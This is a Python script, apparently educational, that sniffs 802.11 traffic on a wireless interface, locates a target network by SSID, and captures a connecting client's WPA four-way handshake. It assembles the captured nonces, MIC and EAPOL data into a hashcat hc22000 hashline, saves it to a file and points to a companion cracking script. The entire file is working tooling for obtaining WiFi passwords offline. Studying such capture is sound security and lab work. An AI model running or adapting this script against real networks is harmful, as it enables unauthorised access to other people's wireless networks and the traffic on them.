import socket, sys, struct

# The 802.11 Frame Control Fields,
# See https://en.wikipedia.org/wiki/802.11_Frame_Types
fc_fields = dict(
    beacon=b'\x80\x00',
    association_request=b'\x00\x00',
    association_response=b'\x10\x00',
    data_frame_from_ds=b'\x08\x02',
    data_frame_to_ds=b'\x08\x01',
    qos_data_frame_from_ds=b'\x88\x02',
    qos_data_frame_to_ds=b'\x88\x01',
)

interface = 'wlan1'
essid = 'ZDA WiFi'
network_found = False
client_associating = False
message_num = 0
mac_ap = None
mac_cl = None
nonce_ap = None
nonce_cl = None
hashline = None

# User Supplied Values: 
# WiFi Interface, SSID, MAC Address of AP
if len(sys.argv) > 1:
    interface=sys.argv[1]
if len(sys.argv) > 2:
    essid=sys.argv[2]
if len(sys.argv) > 3:
    mac_ap = bytes.fromhex("".join(sys.argv[3].replace("-", ":").split(":")))

# Use WiFi interface to capture packets
rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
rawSocket.bind((interface, 0x0003))

# Listen for packets from target network
while True:
    packet = rawSocket.recvfrom(2048)[0]

    # Radiotap Header Version and Length (both 2 bytes, little endian)
    # See https://www.kernel.org/doc/html/v5.8/networking/mac80211-injection.html
    rtap_version = int.from_bytes(packet[0:2], byteorder='little')
    rtap_header_length = int.from_bytes(packet[2:4], byteorder='little')

    if rtap_version == 0:                     # Confirm radiotap version v0
        packet = packet[rtap_header_length:]  # Remove header, leave 802.11 frame
        frame_control_field = packet[0:2]
        address_1 = packet[4:10]
        address_2 = packet[10:16]
        # Address 3 (6 Bytes), Sequence Control (2 Bytes) 
        # and Address 4 (6 Bytes) are not needed here and
        # take up 16->30, see wiki refrenced above
        frame_body = packet[30:]

        if not network_found and frame_control_field == fc_fields['beacon'] and\
            essid in str(frame_body) and not (mac_ap != None and mac_ap != address_2):
            mac_ap = address_2
            network_found = True
            print("\n")
            print("Network Found:")
            print("--------------")
            print("SSID:                     ", essid)
            print("AP MAC Address:           ", "%02x:%02x:%02x:%02x:%02x:%02x" %\
                                                struct.unpack("BBBBBB", mac_ap))
            print('\nListen for connections to network...')

        elif network_found and (address_1 == mac_ap or address_2 == mac_ap):
            if frame_control_field == fc_fields['association_response']:
                client_associating = True
                mac_cl = address_1
                print('Device connecting, listening for handshake...')

            elif client_associating:
                
                if frame_control_field in (fc_fields['data_frame_from_ds'], fc_fields['data_frame_to_ds']):

                    # Offset may vary depending on equipment and AP. Some setups have QoS/HT Controls bytes 
                    # before frame body and some have additional bytes from extra headers. 2 worked in test
                    # networks with ESP8266 APs but your setup may need to use 0, 4, 6 or something else.
                    offset = 2                         
                    eapol_frame = frame_body[offset:]
                    eapol_frame_before_mic = eapol_frame[:81]
                    mic = eapol_frame[81:97]
                    nonce = eapol_frame[17:49]
                    wpa_length = eapol_frame[97:99]

                    message_num += 1
                    print("Captured handshake ", message_num, '/ 4')

                    data_from_ap = frame_control_field == fc_fields['data_frame_from_ds']
                    data_from_cl = frame_control_field == fc_fields['data_frame_to_ds']

                    if   message_num == 1 and data_from_ap: nonce_ap = nonce
                    elif message_num == 2 and data_from_cl: 
                        nonce_cl = nonce
                        eapol_client = b''.join([eapol_frame_before_mic, bytearray(16), eapol_frame[97:]])
                        
                        # We've captured all the information we need to crack the password at this point.
                        # We can now crack password with hashcat or our crack_handshake.py script, see:
                        # https://github.com/ZeroDayArcade/cracking-wpa-with-handshake

                        # Hashcat hc22000 format hashline for cracking
                        hashline = "WPA*02*" + mic.hex() + "*" + mac_ap.hex() + "*" + mac_cl.hex() + "*" +\
                            bytes(essid, 'utf-8').hex() + "*" + nonce_ap.hex() + "*" +\
                            eapol_client.hex() + "*00"

                    elif message_num == 3 and data_from_ap: continue
                    elif message_num == 4 and data_from_cl:

                        # Print Hashline and Save to File
                        print("\n" + "Hashline: " + "\n" + "---------")
                        print(hashline) 
                        with open('hashline.txt', 'w') as f:
                            f.write(hashline)
                        break
                    else: 
                        print("Could not capture handshake! Run script again.")
                        break